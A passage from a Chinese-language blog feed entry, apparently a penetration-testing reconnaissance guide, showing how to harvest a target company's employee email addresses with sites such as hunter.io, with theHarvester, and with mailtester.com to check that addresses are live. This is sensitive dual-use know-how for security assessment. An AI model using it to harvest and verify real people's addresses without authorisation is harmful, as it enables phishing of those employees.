class="number">1</span></span><br><span class="line">        f2.write(result2[<span class="number">0</span>]+<span class="string">&quot;:&quot;</span>+result1[<span class="number">0</span>]+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;提取数：&quot;</span>+<span class="built_in">str</span>(i))</span><br></pre></td></tr></table></figure><h2 id="员工邮箱收集"><a href="#员工邮箱收集" class="headerlink" title="员工邮箱收集"></a>员工邮箱收集</h2><p>进过我们上面的一大波收集信息，我们可以知道的前置信息</p><ul><li>C段中哪些IP的对应的端口是邮箱</li><li>子域名是邮箱地址</li></ul><p>如果以上方式都没有收集到我们需要的邮箱的地址的话，那我们还有办法（方法不全，主要是因为这个不常用</p><h3 id="利用一些网站来搜索"><a href="#利用一些网站来搜索" class="headerlink" title="利用一些网站来搜索"></a>利用一些网站来搜索</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;部分免费</span><br><span class="line">https:&#x2F;&#x2F;hunter.io</span><br><span class="line">&#x2F;&#x2F;部分免费</span><br><span class="line">http:&#x2F;&#x2F;www.skymem.info</span><br><span class="line">&#x2F;&#x2F;这个网站免费</span><br><span class="line">https:&#x2F;&#x2F;www.email-format.com&#x2F;i&#x2F;search&#x2F;</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/InformationGathering/6.png" alt="image-20200725131737949"></p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/InformationGathering/6.png" alt="image-20200725130658393"></p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/InformationGathering/7.png" alt="image-20200725130959273"></p><p>接下来是开源项目</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;laramies&#x2F;theHarvester</span><br></pre></td></tr></table></figure><p>这项目还挺不错的，直接输入域名然后写入到html文件中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 theHarvester.py -d xxxxx.com -l 2000 -b all -f test.html</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/InformationGathering/9.png" alt="image-20200725162758219"></p><h3 id="查看邮箱是否再用"><a href="#查看邮箱是否再用" class="headerlink" title="查看邮箱是否再用"></a>查看邮箱是否再用</h3><p>有时候有可能目标员工离职了之类的话，这个邮箱可能有不能使用了，那么我们可以用这个网站来进行测试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;mailtester.com&#x2F;testmail.php</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/InformationGathering/8.png" alt="image-20200725143449599"></p><p>或者写个批量脚本批量跑</p><p>参考文章</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;docs.github.com&#x2F;cn&#x2F;github&#x2F;searching-for-information-on-github&#x2F;understanding-the-search-syntax</span><br><span class="line">https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s?__biz&#x3D;MzAwMzYxNzc1OA&#x3D;&#x3D;&amp;mid&#x3D;2247483886&amp;idx&#x3D;1&amp;sn&#x3D;4c98836e278737054a2d32416007fa27&amp;chksm&#x3D;9b39275fac4eae490e0c5ca5f90887aa3b8a441f137d18d3b73470ba46577b41ea3a9cfa1342&amp;mpshare&#x3D;1&amp;scene&#x3D;1&amp;srcid&#x3D;0724A6jortzlAN8nrOPDkXZV&amp;sharer_sharetime&#x3D;1595586201150&amp;sharer_shareid&#x3D;de4f8e5a5ad7bd6a89317b77fa1ff085#rd</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    
  </entry>
  
</feed>
